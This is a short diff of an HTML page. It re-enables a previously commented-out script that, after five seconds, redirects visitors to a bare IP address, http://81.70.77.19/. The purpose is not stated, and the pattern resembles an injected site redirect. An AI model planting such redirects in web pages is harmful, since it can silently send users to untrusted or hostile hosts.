@@ -1,6 +1,6 @@
-<!-- script language="javascript" type="text/javascript">
+<script language="javascript" type="text/javascript">
  setTimeout("javascript:location.href='http://81.70.77.19/'",5000);
-</script -->
+</script>
 <style type="text/css">
 body {
   background-color: #eee;
